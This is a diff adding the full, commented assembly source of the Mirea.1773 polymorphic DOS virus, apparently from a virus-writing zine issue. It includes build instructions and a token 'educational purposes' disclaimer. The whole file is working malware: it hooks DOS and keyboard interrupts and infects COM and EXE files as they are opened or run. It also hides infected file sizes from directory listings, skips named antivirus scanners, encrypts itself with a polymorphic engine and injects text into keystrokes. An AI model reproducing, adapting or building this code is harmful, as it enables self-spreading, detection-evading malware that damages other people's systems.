@@ -1,0 +1,1088 @@
+;
+;                          |- Source of Kaos -|
+;                          |-    Issue #2    -|
+;
+; Disclaimer:
+; This source code is provided educational purposes.  SOK takes no
+; responsiblity for how this source code is used.
+;
+;
+;
+;
+;
+; Mirea.1773
+;
+; Polymorphic Encrypted EXE/COM Virus
+; Hooks Int 21h and Int 09h
+; Poly uses small set of random instructions.
+; As a payload the virus plays with the keyboard.  After 1000 keys have
+; been pressed it inserts the virus name in RUSSIAN into the buffer, where
+; it is typed instead of users keystrokes.
+; Mirea.1773 is also file-stealth.  It catches FIND FIRST and FIND NEXT
+; routines (both Normal and FCB calls) and subtracts the virus size from file
+; if it is infected.
+; No antidebugging found in code.
+; The virus also traces Int 21h Handler to find REAL Int 21h vectors.
+; Error handler is taken over during infection.
+; Infection marker used is a '&' as last byte of infected file.  It also
+; modifies the files date to show infection during the FIND FIRST & FIND NEXT
+; routines.
+; This is a harmless virus with no damaging payload.
+;
+; Notes: The poly engine diassembly is VERY rough as I don't have much time
+;        to comment everything, but it should be self-explanatory.
+;        Assembly with TASM 4.0 and /M switch.  Use EXE2COM on file after
+;        compiling.
+
+
+p386n
+
+seg000          segment byte public 'CODE' use16
+                assume cs:seg000
+                assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
+
+VirusStart:
+                sti     
+                jmp     short RealStart
+
+VirusName       db 'POLYMORPHIC MIREA'
+
+RealStart:                              
+                call    $+3
+
+
+Next            proc far                
+                pop     si              ; Get Delta Offset
+                db      83h, 0EEh, offset Next  ; SUB SI, Offset Next
+                mov     byte ptr cs:[si+6ECh], '&'
+                cld     
+                push    ax
+                push    bx
+                mov     ax, 0ABCCh
+                int     21h             ; Virus Installation Check
+                cmp     ax, 1993h       ; Installed Already?
+                jnz     InstallVirus    ; No? Then JMP.
+                jmp     RestoreProg
+
+InstallVirus:                           
+                push    si
+                push    ds
+                push    es
+                push    si
+                mov     ax, es
+                dec     ax
+                mov     es, ax          ; ES points to MCB
+                assume es:nothing
+                mov     bx, 3
+                sub     word ptr es:[bx], 0E7h; Subtract 3696 Bytes
+                dec     bx
+                mov     ax, [bx]
+                sub     ax, 0E7h 
+                mov     [bx], ax
+                push    ax
+                add     ax, 3
+                mov     es, ax          ; ES points to Virus Segment
+                assume es:nothing
+                push    cs
+                pop     ds              ; DS = CS
+                assume ds:seg000
+                xor     di, di
+                pop     ax
+                mov     cx, 1773        ; Move 1773 Bytes
+                rep movsb               ; Move Virus Into Memory
+                pop     bx
+                push    es
+                pop     ds
+                assume ds:nothing
+                push    es
+                mov     ds:KeyCount, 0  ; Clear Key Count
+                mov     ds:DoPayloadFlag, 0; Set DoPayload Count
+                push    bx
+                mov     ax, 3509h
+                int     21h             ; Get Int 09h Vectors
+                mov     ds:Int09Ofs, bx ; Store Int 09h Offset
+                mov     ds:Int09Seg, es ; Store Int 09h Segment
+                mov     al, 1
+                int     21h             ; Get Int 01h Vectors
+                mov     si, bx
+                mov     di, es
+                mov     ah, 25h
+                mov     dx, offset NewInt01
+                int     21h             ; Set New Int 01h Handler
+                pop     ax
+                push    ax
+                pushf   
+                push    cs
+                add     ax, offset Int01Done
+                push    ax              ; Store Offset of Int01Done
+                mov     ax, 3521h
+                int     21h             ; Get Int 21h Vectors
+                mov     ds:Int21Ofs, bx ; Store Int 21h Offset
+                mov     ds:Int21Seg, es ; Store Int 21h Segment
+                cli     
+                pushf   
+                pop     ax
+                or      ax, 100h        ; Set Trap Flag
+                push    ax
+                push    es
+                push    bx              ; Store Int 21h Vectors
+                mov     ax, 2509h
+                mov     ds:TraceFlag, 1 ; Set Int 01h Flag
+                mov     dx, offset NewInt09
+                iret    
+
+NewInt01:                               
+                push    bp
+                mov     bp, sp
+                cmp     cs:TraceFlag, 1 ; Is Trace Active?
+                jz      TraceActive     ; Yes? Then JMP.
+
+ClearInt01:                             
+                and     word ptr [bp+6], 0FEFFh; Clear Trap Flag
+                mov     cs:TraceFlag, 0 ; Clear Trace Flag
+                pop     bp
+                iret    
+
+TraceActive:                            
+                cmp     word ptr [bp+4], 300h; Above Dos Segment?
+                ja      NotGoodSegment  ; Yes? Then JMP.
+                cmp     word ptr [bp+4], 40h; Is this DOS Segment?
+                ja      GotLowSegment   ; Yes? Then JMP.
+
+NotGoodSegment:                         
+                pop     bp
+                iret    
+
+GotLowSegment:                          
+                push    bx
+                mov     bx, [bp+2]
+                mov     cs:TraceOfs, bx ; Store Real Offset
+                mov     bx, [bp+4]
+                mov     cs:TraceSeg, bx ; Store Real Segment
+                pop     bx
+                jmp     short ClearInt01
+
+Int01Done:                              
+                mov     ds:TraceFlag, 0 ; Clear Trace Flag
+                mov     ax, 2501h
+                mov     dx, si
+                mov     ds, di
+                int     21h             ; Restore Int 01h Vectors
+                xor     ax, ax
+                mov     si, ax
+                mov     es, ax          ; ES points to IVT
+                assume es:nothing
+                mov     di, 84h         ; Offset of Int 21h Vectors
+                mov     ax, offset NewInt21
+                stosw                   ; Set New Int 21h Offset
+                pop     bx
+                pop     ax
+                stosw                   ; Set New Int 21h Segment
+                push    cs
+                push    ax
+                mov     ax, offset RestoreRegs
+                add     ax, bx
+                pop     es
+                assume es:nothing
+                push    ax
+                mov     ax, offset VirReturn
+                push    es
+                push    ax
+                retf    
+
+VirReturn:                              
+                push    cs
+                pop     ax
+                sub     ax, 3
+                mov     cs:VirStart, ax
+                lds     si, dword ptr cs:OfsPoly
+                call    SetupPolyRoutine
+                mov     di, offset NewCopy
+                call    PolyEngineStart
+                push    cs
+                pop     ds
+                assume ds:seg000
+                mov     NewVirSize, ax
+                xor     si, si
+                mov     cx, 1773        ; Move 1773 Bytes
+                push    di
+                push    cx
+                rep movsb               ; Move Virus Into Memory
+                pop     cx
+                dec     cx
+                pop     si
+                call    DoCrypto
+                retf    
+
+RestoreRegs:                            
+                pop     es
+                pop     ds
+                assume ds:nothing
+                pop     si
+
+RestoreProg:                            
+                pop     bx
+                pop     ax
+                add     si, offset exeHeader
+                cmp     word ptr cs:[si], 'ZM'; EXE File?
+                jz      RestoreEXE      ; Yes? Then JMP.
+                mov     di, 100h
+                push    di              ; Store Offset of Original Program
+                movsw                   ; Restore Original Bytes
+                movsb                   ; Restore Original Byte
+                retn                    ; Return to original program
+
+RestoreEXE:                             
+                mov     cx, ds
+                add     cx, 10h
+                mov     dx, cx
+                add     dx, cs:[si+0Eh]
+                cli     
+                mov     ss, dx
+                mov     sp, cs:[si+10h]
+                sti     
+                add     cx, cs:[si+16h]
+                push    cx
+                push    word ptr cs:[si+14h]
+                retf                    ; Return to Original Program
+Next            endp
+
+
+NewInt09:                               
+                push    ax
+                push    bx
+                push    ds
+                push    es
+                push    cs
+                pop     ds
+                assume ds:seg000
+                mov     bx, 40h
+                mov     es, bx          ; ES points to CMOS
+                assume es:nothing
+                mov     bx, 1Ch
+                mov     ax, es:[bx]     ; Get Buffer Tail Pointer
+                pushf   
+                call    dword ptr cs:Int09Ofs; Do Int 09h
+                cmp     ax, es:[bx]     ; Same Pointer?
+                jz      NoInt09Payload  ; Yes? Then JMP.
+                cmp     KeyCounter, 255 ; KeyCounter = 255?
+                jz      NoInt09Payload  ; Yes? Then JMP.
+                mov     bx, ax
+                cmp     byte ptr es:[bx], 0; No Keys?
+                jz      NoInt09Payload  ; Yes? Then JMP.
+                mov     al, DoPayloadFlag
+                and     al, al          ; Done 10 Times?
+                jnz     DoPayload       ; No? Then JMP.
+                inc     KeyCount        ; Increase Key Count
+                cmp     KeyCount, 1000  ; 1000 Keys Pressed?
+                jb      NoInt09Payload  ; Not yet? Then JMP.
+                mov     KeyCount, 0     ; Clear Key Counter
+                mov     DoPayloadFlag, 10
+                jmp     short NoInt09Payload
+
+DoPayload:                              
+                neg     al
+                add     al, 0Ah
+                push    bx
+                mov     bx, offset VirNameRussian
+                xlat                    ; Translate offset of Virus Name 
+                                        ; In Russian
+                pop     bx
+                mov     es:[bx], al     ; Set New Buffer Tail Pointer
+                dec     DoPayloadFlag
+
+NoInt09Payload:                         
+                                        
+                pop     es
+                assume es:nothing
+                pop     ds
+                assume ds:nothing
+                pop     bx
+                pop     ax
+                iret    
+
+DoDOSFunc       proc near               
+                                        
+                pushf   
+                cli     
+                call    dword ptr cs:TraceOfs
+                retn    
+DoDOSFunc       endp
+
+
+JMPReal21:                              
+                clc     
+                cli     
+                jmp     dword ptr cs:Int21Ofs
+
+InstallCheck:                           
+                mov     ax, 1993h       ; I'm HERE!
+
+ClearCarry:                             
+                clc                     ; Clear Carry Flag
+
+ErrorInFunc:                            
+                retf    2
+
+NewInt21:                               
+                sti     
+                cmp     ax, 0ABCCh      ; Installation Check?
+                jz      InstallCheck    ; Yes? Then JMP.
+                cmp     cs:KeyCounter, 0FFh
+                jz      JMPReal21
+                cmp     ah, 4Eh         ; Find First File?
+                jz      FindFiles
+                cmp     ah, 4Fh         ; Find Next File?
+                jnz     NotFindFile     ; No? Then JMP.
+
+FindFiles:                              
+                call    DoDOSFunc       ; Find File
+                jb      ErrorInFunc     ; Problems? Then JMP.
+                push    ax
+                push    bx
+                push    es
+                mov     ah, 2Fh
+                call    DoDOSFunc       ; Get DTA Segment
+                test    word ptr es:[bx+18h], 8000h; Infected Already?
+                jz      NotInfectFind   ; No? Then JMP.
+                sub     word ptr es:[bx+1Ah], 1853; Subtract VirusSize from File
+                sbb     word ptr es:[bx+1Ch], 0
+
+NotInfectFind:                          
+                pop     es
+                pop     bx
+                pop     ax
+                jmp     short ClearCarry
+
+NotFindFile:                            
+                cmp     ah, 11h         ; Find First File (FCB)?
+                jz      FindFileFCB     ; Yes? Then JMP.
+                cmp     ah, 12h         ; Find Next File (FCB)?
+                jnz     NotFindFCB      ; No? Then JMP.
+
+FindFileFCB:                            
+                call    DoDOSFunc       ; Find File
+                and     al, al          ; Found one?
+                jnz     ErrorInFunc     ; No? Then JMP.
+                push    ax
+                push    bx
+                push    es
+                mov     ah, 2Fh
+                call    DoDOSFunc       ; Get DTA Segment
+                test    word ptr es:[bx+20h], 8000h; Infected Already?
+                jz      NoInfectFCB     ; No? Then JMP.
+                sub     word ptr es:[bx+24h], 1853; Subtract VirusSize from Real Size
+                sbb     word ptr es:[bx+26h], 0
+
+NoInfectFCB:                            
+                pop     es
+                pop     bx
+                pop     ax
+                jmp     short ClearCarry
+
+NotFindFCB:                             
+                cmp     ax, 4B00h       ; Set Execution State?
+                jz      InfectFile      ; Yes? Then JMP.
+                cmp     ah, 3Dh         ; Open File?
+                jz      InfectFile      ; Yes? Then JMP.
+                cmp     ah, 43h         ; Get/Set File Attributes?
+                jz      InfectFile      ; Yes? Then JMP.
+                cmp     ah, 56h         ; Rename File?
+                jnz     NotViriiFunc    ; No? Then JMP.
+
+InfectFile:                             
+                                        
+                call    CheckFileName
+                jnz     NotViriiFunc    ; Bad Extension? Then JMP.
+                call    DoInfect
+
+NotViriiFunc:                           
+                jmp     JMPReal21
+
+
+CheckFileName   proc near               
+                push    ax
+                push    si
+                mov     si, dx
+                cld     
+
+FindExtension:                          
+                lodsb
+                and     al, al          ; End of Filename?
+                jz      NoExtension     ; Yes? Then JMP.
+                cmp     al, '.'         ; Extension Found?
+                jnz     FindExtension   ; No? Then JMP.
+                mov     ax, [si-9]
+                and     ax, 0DFDFh      ; Capitalize Letters
+                cmp     ax, 'IA'        ; AIDSTEST?
+                jz      NoExtension     ; Yes? Then JMP.
+                mov     ax, [si-5]
+                and     ax, 0DFDFh
+                cmp     ax, 'CS'        ; SCAN?
+                jz      NoExtension     ; Yes? Then JMP.
+                lodsw
+                and     ax, 0DFDFh
+                cmp     ax, 'OC'        ; COM File?
+                jnz     NotCOMExt       ; No? Then JMP.
+                lodsb
+                and     al, 0DFh
+                cmp     al, 'M'         ; COM File?
+                jmp     short NotEXEExt
+
+NotCOMExt:                              
+                cmp     ax, 'XE'        ; EXE File?
+                jnz     NotEXEExt       ; No? Then JMP.
+                lodsb
+                and     al, 0DFh
+                cmp     al, 'E'         ; EXE File?
+
+NotEXEExt:                              
+                                        
+                pop     si
+                pop     ax
+                retn    
+
+NoExtension:                            
+                                        
+                inc     al
+                jmp     short NotEXEExt
+CheckFileName   endp
+
+
+
+DoInfect        proc near               
+                push    ax
+                push    bx
+                push    cx
+                push    dx
+                push    si
+                push    ds
+                push    es
+                mov     ax, 3524h
+                call    DoDOSFunc       ; Get Int 24h Vectors
+                push    bx
+                push    es
+                push    dx
+                push    ds
+                push    cs
+                pop     ds              ; DS = CS
+                assume ds:seg000
+                mov     dx, offset NewInt24
+                mov     ax, 2524h
+                call    DoDOSFunc       ; Set New Int 24h Vectors
+                pop     ds
+                assume ds:nothing
+                pop     dx
+                mov     si, dx
+                mov     ax, 121Ah
+                int     2Fh             ; Get File Drive
+                mov     cs:FileDrive, al; Store File Drive
+                mov     ax, 4300h
+                call    DoDOSFunc       ; Get File Attributes
+                jb      NoAccessFile    ; Problems? Then JMP.
+                test    cl, 1Ch         ; Read Only File?
+                jnz     NoAccessFile    ; Yes? Then JMP.
+                push    cx
+                xor     cx, cx
+                mov     ax, 4301h
+                call    DoDOSFunc       ; Clear File Attributes
+                jb      RestoreAttrib
+                mov     ax, 3D02h
+                call    DoDOSFunc       ; Open File
+                jb      CantOpenFile    ; Problems? Then JMP.
+                mov     bx, ax          ; Store FileHandle in BX
+                push    dx
+                push    ds
+                push    cs
+                pop     ds              ; DS = CS
+                assume ds:seg000
+                call    CheckFile
+                pop     ds
+                assume ds:nothing
+                pop     dx
+                mov     ah, 3Eh
+                call    DoDOSFunc       ; Close File
+
+CantOpenFile:                           
+                pop     cx
+                mov     ax, 4301h
+                call    DoDOSFunc       ; Restore File Attributes
+
+NoAccessFile:                           
+                                        
+                pop     ds
+                pop     dx
+                mov     ax, 2524h
+                call    DoDOSFunc       ; Restore Int 24h Handler
+                pop     es
+                pop     ds
+                pop     si
+                pop     dx
+                pop     cx
+                pop     bx
+                pop     ax
+                retn    
+
+RestoreAttrib:                          
+                pop     cx
+                jmp     short NoAccessFile
+DoInfect        endp
+
+
+
+CheckFile       proc near               
+                mov     ax, 5700h
+                call    DoDOSFunc       ; Get File Date/Time
+                mov     ds:FileDate, dx ; Store FileDate
+                mov     ds:FileTime, cx ; Store FileTime
+                mov     cx, 0FFFFh
+                mov     dx, 0FFFFh
+                mov     ax, 4202h
+                call    DoDOSFunc       ; Move File Pointer to End of File - 1
+                mov     dx, offset exeHeader
+                mov     cx, 1
+                mov     ah, 3Fh
+                call    DoDOSFunc       ; Read In Last Byte
+                cmp     byte ptr ds:exeHeader, '&'; Infected Already?
+                jnz     GoodFile        ; No? Then JMP.
+                jmp     RestoreDT
+
+GoodFile:                               
+                push    bx
+                mov     dl, ds:FileDrive
+                mov     ah, 36h
+                call    DoDOSFunc       ; Get Drive Free Space
+                xchg    ax, bx
+                mul     bx
+                pop     bx
+                and     dx, dx          ; Out of Space?
+                jnz     GotEnoughSpace  ; No? Then JMP.
+                cmp     ax, 2           ; Enough Space?
+                jnb     GotEnoughSpace  ; Yes? Then JMP.
+                retn    
+
+GotEnoughSpace:                         
+                                        
+                xor     cx, cx
+                xor     dx, dx
+                mov     ax, 4200h
+                call    DoDOSFunc       ; Move Pointer to Beginning of File
+                mov     dx, offset exeHeader
+                mov     cx, 28
+                mov     ah, 3Fh
+                call    DoDOSFunc       ; Read In File Header
+                jb      CantReadFile    ; Problems? Then JMP.
+                push    di
+                push    si
+                push    es
+                push    cs
+                pop     es              ; ES = CS
+                assume es:seg000
+                mov     si, offset exeHeader
+                mov     ax, ds:VirusSize
+                add     ax, offset exeHeader
+                mov     di, ax
+                push    di
+                mov     cx, 1Ch
+                push    cx
+                rep movsb               ; Copy File Header to End of Virus
+                pop     cx
+                pop     si
+                call    DoCrypto
+                pop     es
+                assume es:nothing
+                pop     si
+                pop     di
+                xor     cx, cx
+                xor     dx, dx
+                mov     ax, 4202h
+                call    DoDOSFunc       ; Move File Pointer to End of File
+                cmp     ds:exeHeader, 'ZM'; EXE File?
+                jz      GotEXEFile      ; Yes? Then JMP.
+                cmp     ax, 1024        ; Is file less than 1024 Bytes?
+                jb      CantReadFile    ; Yes? Then JMP.
+                cmp     ax, 61184       ; Is file smaller than 61184 Bytes?
+                jbe     GoodSizeCOM     ; Yes? Then JMP.
+
+CantReadFile:                           
+                                        
+                retn    
+
+GotEXEFile:                             
+                push    ax
+                push    dx
+                mov     cx, 200h
+                div     cx              ; Divide Filesize by 512
+                inc     ax
+                cmp     ax, ds:exeFDIV  ; Compare DIV FileSize
+                jnz     NotSameDIV      ; Not the same? Then JMP.
+                cmp     dx, ds:exeFMOD  ; Compare MOD Filesize
+
+NotSameDIV:                             
+                pop     dx
+                pop     ax
+                jnz     CantReadFile
+
+GoodSizeCOM:                            
+                push    ax
+                push    dx
+                mov     dx, ds:NewVirOfs
+                mov     cx, ds:NewVirSize
+                mov     ah, 40h
+                call    DoDOSFunc       ; Write Virus To File
+                pop     dx
+                pop     ax
+                jb      CantReadFile    ; Problems? Then JMP.
+                cmp     ds:exeHeader, 'ZM'; EXE File?
+                jz      FixEXEHeader    ; Yes? Then JMP.
+                mov     byte ptr ds:exeHeader, 0E9h; Set JMP Instruction
+                sub     ax, 3
+                mov     ds:exeHeader+1, ax; Set JMP Offset
+                jmp     short WriteJMP
+
+FixEXEHeader:                           
+                push    ax
+                push    dx
+                add     ax, ds:NewVirSize
+                adc     dx, 0
+                mov     cx, 200h
+                div     cx              ; Divide New Size by 512
+                inc     ax
+                mov     ds:exeFDIV, ax  ; Set New FDIV
+                mov     ds:exeFMOD, dx  ; Set new FMOD
+                pop     dx
+                pop     ax
+                mov     si, ds:exeHeadSize
+                mov     cl, 4
+                shl     si, cl
+                sub     ax, si
+                sbb     dx, 0
+                mov     cx, 10h
+                div     cx
+                mov     ds:exeCS, ax
+                mov     ds:exeIP, dx
+                mov     ds:exeSS, ax
+                mov     ds:exeSP, 1000h
+
+WriteJMP:                               
+                xor     cx, cx
+                xor     dx, dx
+                mov     ax, 4200h
+                call    DoDOSFunc       ; Move Pointer to Beginning of File
+                mov     dx, offset exeHeader
+                mov     cx, 28
+                mov     ah, 40h
+                call    DoDOSFunc       ; Write JMP to File
+
+RestoreDT:                              
+                mov     dx, ds:FileDate
+                mov     cx, ds:FileTime
+                test    dx, 8000h       ; Infected File?
+                jnz     FixedTime       ; Yes? Then JMP.
+                add     dx, 0C800h      ; Mark File as Infected
+
+FixedTime:                              
+                mov     ax, 5701h
+                call    DoDOSFunc       ; Restore File Date/Time
+                retn    
+CheckFile       endp
+
+
+NewInt24:                               
+                mov     al, 3
+                iret    
+
+
+GetRandFromTimer proc near                                                                                             
+                push    ds
+                push    si
+                push    dx
+                push    bx
+                xor     ax, ax
+                mov     ds, ax          ; DS points to IVT
+                assume ds:nothing
+                mov     si, 46Ch
+                cli     
+                lodsb                   ; Get Timer Tick Count
+                sti     
+                mov     bx, cs:RandSeed
+                add     ax, bx
+                adc     dx, 0
+                push    ax
+                xchg    ah, al
+                rol     ax, 1
+                mov     cs:RandSeed, ax
+                pop     ax
+                pop     bx
+                pop     dx
+                pop     si
+                pop     ds
+                assume ds:nothing
+                retn    
+GetRandFromTimer endp
+
+GarbageTable    db 0FCh                 ; CLD
+                db 90h                  ; NOP
+                db 0FBh                 ; STI
+                db 0F8h                 ; CLC
+                db 0FAh                 ; CLI
+                db 26h                  ; ES:
+                db 2Eh                  ; CS:
+                db 3Eh
+CryptTable      db 3                    
+                db 3
+                db 6
+                db 0
+                db 7
+                db 1
+CodeTable       db 80h                  
+                db 3
+                dw 0AC34h
+                db 4
+                db 0F6h
+                db 2
+                dw 0B114h
+                db 4
+                db 0D0h
+                db 2
+                dw 0BB0Ch
+                db 4
+                db 0D0h
+                db 2
+                db 4
+                db 0B6h
+                db 4
+                db 0FEh
+                db 2
+                db 4
+                db 0C5h
+                db 4
+                db 0FEh
+                db 2
+                db 0Ch
+                db 0C0h
+                db 4
+                db 80h
+                db 3
+                db 4
+                db 0CFh
+                db 4
+                db 80h
+                db 3
+                dw 0CA2Ch
+                db 4
+CodeTableOfs1   db 3                                                            
+CodeTableOfs2   db 3                                                                                                   
+CodeTableOfs3   db 2                                                            
+AfterBytesCrypt dw 724h                                                         
+Rand4           db 0                                                            
+RandNumber      db 0                                                            
+CryptOffset     dw 712h                                                         
+OfsCrypted      dw 719h                                                         
+NewVirOfs       dw 6FDh                                                                                                 
+VirusSize       dw 1854                                                         
+RandSeed        dw 4984h                                                        
+
+GetRandFromTable proc near              
+                                        
+                call    GetRandFromTimer; Get Random Number
+                and     ax, cx
+                push    bx
+                add     ax, bx
+                mov     bx, ax
+                mov     al, cs:[bx]
+                stosb                   ; Store Random Instruction
+                pop     bx
+                retn    
+GetRandFromTable endp
+
+
+GetPolyGarbageCode proc near                                                                                           
+                push    ax
+                push    bx
+                push    cx
+                call    GetRandFromTimer
+                and     ax, 3
+                inc     ax
+                mov     cs:RandNumber, al; Store Number of Garbage Instructions
+                mov     cx, 7
+                mov     bx, offset GarbageTable
+
+GenRandInstruc:                         
+                call    GetRandFromTable
+                dec     cs:RandNumber
+                jg      GenRandInstruc
+                mov     cx, 3
+                call    GetRandFromTable; Get 1 More Random Instruction
+                pop     cx
+                pop     bx
+                pop     ax
+                retn    
+GetPolyGarbageCode endp
+
+
+
+GetRandShr      proc near               
+                                        
+                call    GetRandFromTimer
+                and     ax, 3
+                cmp     al, 3           ; IS # = 3?
+                jnz     RandNot3        ; No? Then JMP.
+                shr     al, 1
+
+RandNot3:                               
+                retn    
+GetRandShr      endp
+
+StoreInstruction proc near                                                                                              
+                add     al, cl
+                stosb
+                retn    
+StoreInstruction endp
+
+PolyEngineStart proc near               
+                push    cx
+                mov     cs:NewVirOfs, di; Store New Virus Copy Offset
+                xor     dx, dx
+                mov     cx, 80
+                call    GetPolyGarbageCode
+                mov     al, 1Eh
+                stosb                   ; Store PUSH DS Instruction
+
+loc_0_53F:                              ; Get More Garbage Code
+                call    GetPolyGarbageCode
+                mov     al, 0Eh
+                stosb                   ; Store PUSH CS Instruction
+                mov     al, 1Fh
+                stosb                   ; Store POP DS Instruction
+                call    GetRandShr
+                mov     bx, offset CryptTable
+                shl     ax, 1
+                add     ax, bx
+                mov     bx, ax
+                mov     al, cs:[bx+1]
+                mov     cs:CodeTableOfs1, al
+                mov     al, cs:[bx]
+                mov     cs:CodeTableOfs2, al
+                push    ax
+                call    StoreInstruction
+                call    GetPolyGarbageCode
+                call    GetRandShr
+                mov     cs:CodeTableOfs3, al
+                call    StoreInstruction
+                call    GetPolyGarbageCode
+                mov     ax, 0E8h
+                stosw                   ; Store CALL Instruction
+                xor     al, al
+                stosb                   ; Store CALL NEXT
+                mov     cs:CryptOffset, di
+                mov     cx, 58h
+                pop     ax
+                push    ax
+                call    StoreInstruction; Store POP Instruction
+                call    GetPolyGarbageCode
+                mov     ax, 0C081h
+                pop     bx
+                or      ah, bl
+                stosw                   ; Store ADD <REG>, Offset Crypted
+                mov     cs:OfsCrypted, di
+                xor     ax, ax
+                stosw
+                call    GetPolyGarbageCode
+                mov     al, cs:CodeTableOfs3
+                or      al, 0B8h
+                stosb                   ; Store MOV <REG> Instruction
+                mov     bx, 1773        ; Size of Virus
+                call    GetRandFromTimer
+                and     ax, 7
+                add     ax, bx
+                stosw                   ; Store Number of Bytes Crypted
+                call    GetPolyGarbageCode
+                mov     cs:AfterBytesCrypt, di
+                call    GetRandFromTimer
+                and     ax, 7
+                inc     ax
+                mov     cs:Rand4, al
+                mov     bx, 3
+                mul     bx
+                add     si, ax
+                mov     bx, offset CodeTable
+
+SetupCrypto:              
+                push    ds
+                push    si
+                push    cs
+                pop     ds              ; DS = CS
+                assume ds:seg000
+                call    GetRandFromTimer
+                and     ax, 7
+                push    bx
+                mov     bx, 5
+                mul     bx
+                pop     bx
+                add     ax, bx
+                mov     si, ax
+                movsb                   ; Store Random Instruction
+                lodsb                   ; Get Instruction From CodeTable
+                mov     cx, ax
+                lodsb                   ; Get Instruction From CodeTable
+                or      al, cs:CodeTableOfs1
+                stosb                   ; Store First Byte
+                cmp     cl, 3           ; 3 Byte Instruction?
+                jnz     Not3ByteInstruc ; No? Then JMP.
+                call    GetRandFromTimer
+                mov     cx, ax
+                stosb                   ; Store Random Cryptor
+
+Not3ByteInstruc:          
+                lodsw                   ; Get Next 2 Instructions
+                cli     
+                pop     bp
+                pop     dx
+                push    es
+                push    di
+                mov     es, dx
+                mov     di, bp
+                sti     
+                mov     si, ax
+                push    cx
+                movsb
+                lodsb
+                mov     cx, ax
+                movsb
+                cmp     cl, 3           ; 3 Byte Instruction?
+                pop     cx
+                jnz     Not3Num2        ; No? Then JMP.
+                mov     ax, cx
+                stosb
+                dec     di
+
+Not3Num2:                 
+                mov     ds, dx
+                assume ds:nothing
+                dec     cs:Rand4
+                jz      GeneratedCrypto
+                mov     ax, di
+                sub     ax, 5
+                mov     si, ax
+                pop     di
+                pop     es
+                jmp     short SetupCrypto
+
+GeneratedCrypto:          
+                pop     di
+                pop     es
+                call    GetPolyGarbageCode
+                mov     al, 40h
+                add     al, cs:CodeTableOfs2
+                stosb                   ; Store INC <Register
+                call    GetPolyGarbageCode; Get Random Instruction
+                mov     al, 48h
+                add     al, cs:CodeTableOfs3
+                stosb                   ; Store DEC <Register>
+                push    di
+                mov     ax, di
+                add     ax, 2
+                mov     di, ax
+                mov     ax, cs:AfterBytesCrypt
+                sub     ax, di
+                pop     di
+                mov     ah, al          ; Store CryptLoop Offset
+                mov     al, 75h
+                stosw                   ; Store JNE <Offset CryptLoop>
+                call    GetPolyGarbageCode; Generate Poly Shit
+                mov     cx, 58h
+                xor     ax, ax
+                mov     al, cs:CodeTableOfs3
+                call    StoreInstruction
+                mov     al, cs:CodeTableOfs2
+                call    StoreInstruction
+                call    GetPolyGarbageCode
+                mov     al, 1Fh
+                stosb                   ; Store POP DS
+                call    GetPolyGarbageCode
+                mov     ax, di
+                mov     bx, cs:CryptOffset
+                sub     ax, bx
+                mov     bx, cs:OfsCrypted
+                mov     es:[bx], ax     ; Set New Offset of Crypted Code
+                mov     cs:VirusSize, di
+                mov     ax, di
+                sub     ax, cs:NewVirOfs
+                add     ax, 1773        ; Add Size of Virus to Poly Code
+                pop     cx
+                retn    
+PolyEngineStart endp
+
+SetupPolyRoutine proc near
+                push    di
+                push    es
+                push    ds
+                pop     es
+                mov     di, si
+                mov     cx, 46
+                mov     al, 90h
+                rep stosb               ; Store 46 NOP's
+                mov     al, 0CBh
+                stosb                   ; Setup RETF
+                pop     es
+                pop     di
+                retn    
+SetupPolyRoutine endp
+
+
+DoCrypto        proc near 
+                push    ds
+                push    cs
+                pop     ds              ; DS = CS
+                assume ds:seg000
+
+CryptVirus:               
+                call    dword ptr cs:OfsPoly
+                inc     si
+                dec     cx
+                jnz     CryptVirus
+                pop     ds
+                assume ds:nothing
+                retn    
+DoCrypto        endp
+
+NewVirSize      dw 72Eh                                                         
+TraceFlag       db 0                                                            
+OfsPoly         dw 0                    
+VirStart        dw 9F19h                
+Int21Ofs        dw 31BDh                
+Int21Seg        dw 1DC8h                
+VirNameRussian  db ' åàêùÄ-VI '         
+KeyCounter      db 0                    
+exeHeader       dw 3CEBh                                                        
+exeFMOD         dw 5390h                                                        
+exeFDIV         dw 706Fh                                                        
+exeNumSeg       dw 6F68h
+exeHeadSize     dw 2073h                
+exeMinPara      dw 744Ch
+exeMaxPara      dw 2C64h
+exeSS           dw 4F20h                
+exeSP           dw 6678h                
+exeCheckSum     dw 726Fh
+exeIP           dw 2064h                
+exeCS           dw 6173h                
+                dw 7263h
+                dw 6669h
+                db  6Eh
+Int09Ofs        dw ?                    
+Int09Seg        dw ?                    
+TraceOfs        dw ?                    
+TraceSeg        dw ?
+KeyCount        dw ?                    
+                                        
+DoPayloadFlag   db ?                    
+                                        
+FileDate        dw ?                    
+FileTime        dw ?                    
+FileDrive       db ?                    
+NewCopy         db ? 
+seg000          ends
+
+
+                end 
